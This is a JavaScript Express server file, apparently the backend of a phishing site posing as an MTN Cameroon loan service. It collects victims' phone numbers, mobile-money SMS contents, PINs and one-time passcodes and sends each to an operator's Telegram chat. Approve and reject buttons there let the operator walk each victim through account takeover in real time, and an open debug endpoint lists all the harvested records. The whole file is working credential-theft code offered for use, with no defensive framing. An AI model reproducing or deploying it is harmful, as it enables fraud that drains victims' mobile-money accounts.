// ============================================================
// server.js – MTN Cameroon (Clean Version)
// ============================================================
console.log("🟢 1. Server is starting...");
require('dotenv').config();
console.log("🟢 2. dotenv loaded");

const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── In-Memory Store ───
const applications = {};

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    console.log('Please set these in your .env file or Render environment variables');
}

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
console.log('✅ Server starting...');

// ─── Data Persistence ───
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');

if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    console.log('📁 Created data directory');
}

function saveApplications() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(applications, null, 2));
        console.log('💾 Applications saved to disk');
    } catch (error) {
        console.error('❌ Error saving applications:', error);
    }
}

function loadApplications() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            const parsed = JSON.parse(data);
            Object.assign(applications, parsed);
            console.log(`📂 Loaded ${Object.keys(applications).length} applications from disk`);
        }
    } catch (error) {
        console.error('❌ Error loading applications:', error);
    }
}

loadApplications();

// ─── Auto-save every 30 seconds ───
setInterval(() => {
    if (Object.keys(applications).length > 0) {
        saveApplications();
    }
}, 30000);

// ─── Save on shutdown ───
process.on('SIGINT', () => {
    console.log('🔄 Saving data before shutdown...');
    saveApplications();
    process.exit(0);
});

// ─── Telegram Message Sender ───
async function sendTelegramMessage(message, buttons = null) {
    if (!TELEGRAM_BOT_TOKEN) {
        console.error('❌ Cannot send message: TELEGRAM_BOT_TOKEN is missing');
        return { ok: false, error: 'Bot token missing' };
    }

    console.log('📤 Sending to Telegram...');
    console.log('📋 Message:', message);

    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
    if (buttons) {
        body.reply_markup = { inline_keyboard: buttons };
    }

    try {
        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const result = await response.json();
        console.log('📤 Telegram response:', JSON.stringify(result, null, 2));
        return result;
    } catch (error) {
        console.error('❌ Error sending Telegram message:', error);
        return { ok: false, error: error.message };
    }
}

// ─── Test Endpoints ───
app.get('/api/test', async (req, res) => {
    try {
        const result = await sendTelegramMessage('✅ *Bot is online!*\n\nIf you see this, everything is working!');
        res.json({ ok: true, result });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

app.get('/api/test-poll', async (req, res) => {
    try {
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', test: true }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', test: true }) }
        ]];
        const result = await sendTelegramMessage('🧪 *Test Poll*\n\nPlease click a button:', buttons);
        res.json({ ok: true, result });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 1. Application Submission ───
app.post('/api/send-application', async (req, res) => {
    try {
        const data = req.body.applicationData;
        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;

        applications[applicationId] = {
            ...data,
            smsStatus: 'pending',
            pinStatus: 'pending',
            otpStatus: 'pending',
            createdAt: new Date().toISOString()
        };

        saveApplications();

        console.log(`📝 Application created: ${applicationId}`);

        const message = `📋 *NEW LOAN APPLICATION (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n💰 Amount: XAF ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n\n✅ *Please approve or reject this application:*`;

        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        const result = await sendTelegramMessage(message, buttons);

        if (result && result.ok) {
            res.json({ ok: true, applicationId, status: 'waiting_sms' });
        } else {
            res.status(500).json({ ok: false, error: 'Failed to send Telegram message' });
        }
    } catch (error) {
        console.error('Error in /api/send-application:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 2. SMS Submission ───
app.post('/api/send-momo-message', async (req, res) => {
    try {
        const { momoData } = req.body;
        const { applicationId, phone, momoMessage } = momoData;

        applications[applicationId].smsMessage = momoMessage;
        applications[applicationId].smsStatus = 'pending';
        saveApplications();

        const message = `📨 *SMS VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;

        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-momo-message:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 3. PIN Submission ───
app.post('/api/send-pin', async (req, res) => {
    try {
        const { applicationId, pin } = req.body;
        applications[applicationId].pin = pin;
        applications[applicationId].pinStatus = 'pending';
        saveApplications();

        const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;

        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-pin:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 4. OTP Submission ───
app.post('/api/send-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        applications[applicationId].otp = otp;
        applications[applicationId].otpStatus = 'pending';
        saveApplications();

        const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;

        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 5. Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
    console.log('📩 ===== WEBHOOK RECEIVED =====');
    console.log('📝 Full body:', JSON.stringify(req.body, null, 2));

    try {
        // ─── Handle Callback Queries (Button Clicks) ───
        if (req.body.callback_query) {
            const query = req.body.callback_query;
            console.log('🔘 Callback query:', query.data);

            try {
                const { action, step, applicationId } = JSON.parse(query.data);

                // Handle test poll
                if (applicationId === undefined && action === 'YES') {
                    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: query.id,
                            text: '✅ Test button clicked!',
                            show_alert: false
                        })
                    });
                    return res.sendStatus(200);
                }

                const app = applications[applicationId];
                if (!app) {
                    console.log(`❌ Application ${applicationId} not found`);
                    return res.sendStatus(200);
                }

                console.log(`📝 Processing ${step} for ${applicationId}: ${action}`);

                // Update status
                const statusKey = step.toLowerCase() + 'Status';
                if (app[statusKey] === 'pending') {
                    app[statusKey] = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`✅ ${step} status: ${app[statusKey]}`);
                    saveApplications();
                }

                // Answer callback
                await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: query.id,
                        text: `✅ ${action === 'YES' ? 'Approved' : 'Rejected'}!`,
                        show_alert: false
                    })
                });

                // Send confirmation
                const statusText = action === 'YES' ? '✅ Approved' : '❌ Rejected';
                await sendTelegramMessage(`📌 *Status Update (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📋 Step: ${step}\n📌 Status: ${statusText}`);

            } catch (parseError) {
                console.error('❌ Error parsing callback data:', parseError);
            }

            return res.sendStatus(200);
        }

        // ─── Handle Messages ───
        if (req.body.message) {
            console.log('💬 Message received:', req.body.message.text);
        }

        res.sendStatus(200);

    } catch (error) {
        console.error('❌ Webhook error:', error);
        res.sendStatus(500);
    }
});

// ─── 6. Status Check ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        let status = 'pending';
        if (req.params.step === 'sms') status = app.smsStatus;
        else if (req.params.step === 'pin') status = app.pinStatus;
        else if (req.params.step === 'otp') status = app.otpStatus;

        res.json({ ok: true, status });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 7. Debug ───
app.get('/api/debug/applications', (req, res) => {
    res.json({
        total: Object.keys(applications).length,
        applications: applications
    });
});

// ─── Serve Frontend ───
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Serving frontend from: ${path.join(__dirname, '../frontend')}`);
    console.log(`🔗 Test your bot: https://mtn-cameroon-15m7.onrender.com/api/test`);
    console.log(`🔗 Test poll: https://mtn-cameroon-15m7.onrender.com/api/test-poll`);
});
